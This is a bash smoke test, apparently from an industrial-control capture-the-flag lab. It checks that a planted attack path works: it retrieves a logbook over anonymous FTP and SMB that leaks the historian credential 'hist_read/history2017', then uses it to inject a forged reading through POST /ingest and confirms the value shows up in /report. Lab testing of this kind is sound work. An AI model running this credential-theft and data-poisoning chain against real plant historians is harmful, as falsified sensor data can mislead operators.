#!/usr/bin/env bash
# The /ingest endpoint accepts authenticated POSTs with hist_read/history2017
# and writes directly to the readings table. The credential lives in the
# engineering logbook on hex-legacy-1 (anonymous SMB / FTP).
#
# Coverage:
#   Stage 1   ENGINEER.LOG over anonymous FTP exposes hist_read/history2017
#   Stage 2   POST /ingest with valid creds writes a reading
#   Stage 2   POST /ingest with wrong creds is rejected (401)
#   Stage 2   GET /report reflects the injected reading
#
# Usage: bash tests/smoke/test_historian_ingest_poison.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="attacker-machine"
HOME_BOX="admin-home"
LEGACY="legacy-workstation"
ENT_WS="enterprise-workstation"
HISTORIAN="historian"

for c in "$ATTACKER" "$HOME_BOX" "$LEGACY" "$ENT_WS" "$HISTORIAN"; do
    require_running "$c"
done

echo "[ingest] Waiting for hex-legacy-1 FTP and historian web..."
wait_for_port "$HOME_BOX" 10.10.1.10 21 30   || fail "hex-legacy-1 :21 not ready"
wait_for_port "$ENT_WS"   10.10.2.10 8080 30 || fail "historian :8080 not ready"

echo "[ingest] Stage 1a: ENGINEER.LOG over anonymous FTP exposes hist_read"

LOG_DUMP="$(in_container "$HOME_BOX" sh -c '
mkdir -p /tmp/ftp && cd /tmp/ftp
ftp -n -v 10.10.1.10 <<EOF >/dev/null 2>&1
user anonymous anon@x
cd LOGBOOK
get ENGINEER.LOG
quit
EOF
cat ENGINEER.LOG 2>/dev/null
rm -rf /tmp/ftp
')"
assert_contains "$LOG_DUMP" "hist_read" "ENGINEER.LOG mentions hist_read"
assert_contains "$LOG_DUMP" "history2017" "ENGINEER.LOG leaks history2017"

echo "[ingest] Stage 1b: ENGINEER.LOG over anonymous SMB (alternative path)"

# Runbook offers both FTP and SMB as paths to ENGINEER.LOG. Test both so a
# regression in either share surfaces.
SMB_LOG="$(in_container "$HOME_BOX" sh -c "smbclient -N //10.10.1.10/public --option='client min protocol=NT1' -c 'get LOGBOOK/ENGINEER.LOG -' 2>&1")"
assert_contains "$SMB_LOG" "history2017" "anonymous SMB path to ENGINEER.LOG leaks history2017"

echo "[ingest] Stage 2a: /assets endpoint lists historian tags"

# Runbook reads /assets before injecting, to pick a target tag name.
ASSETS_OUT="$(in_container "$ENT_WS" curl -sf -m 5 http://10.10.2.10:8080/assets 2>&1)"
assert_contains "$ASSETS_OUT" "turbine_rpm" "historian /assets lists turbine_rpm"

echo "[ingest] Stage 2b: POST /ingest with valid creds writes a reading"

# Use a distinctive asset name + value so we can read it back without colliding
# with the live PLC poll cron's data.
INJECT_ASSET="ctf_smoke_injected"
INJECT_VALUE="1234.5"
INJECT_TS="2026-05-08T00:00:00"

POST_OUT="$(in_container "$ENT_WS" curl -sf -m 5 \
    -u hist_read:history2017 \
    -X POST -H 'Content-Type: application/json' \
    -d "{\"timestamp\":\"$INJECT_TS\",\"asset\":\"$INJECT_ASSET\",\"value\":$INJECT_VALUE,\"unit\":\"smoke\"}" \
    http://10.10.2.10:8080/ingest 2>&1)"
assert_contains "$POST_OUT" "ok" "POST /ingest with hist_read accepted"

echo "[ingest] Stage 2c: POST /ingest with wrong creds is rejected"

WRONG_CODE="$(in_container "$ENT_WS" curl -s -m 5 -o /dev/null -w '%{http_code}' \
    -u hist_read:wrong_password \
    -X POST -H 'Content-Type: application/json' \
    -d "{\"timestamp\":\"$INJECT_TS\",\"asset\":\"x\",\"value\":0,\"unit\":\"x\"}" \
    http://10.10.2.10:8080/ingest 2>&1)"
if [ "$WRONG_CODE" = "401" ]; then
    ok "POST /ingest with wrong password returns 401"
else
    fail "POST /ingest with wrong password returned HTTP $WRONG_CODE (expected 401)"
fi

echo "[ingest] Stage 2d: GET /report reflects the injected reading"

REPORT_OUT="$(in_container "$ENT_WS" curl -sf -m 5 \
    "http://10.10.2.10:8080/report?asset=$INJECT_ASSET&from=2026-05-01&to=2026-05-31" 2>&1)"
assert_contains "$REPORT_OUT" "1234\\.5" \
    "injected reading visible via GET /report"

summary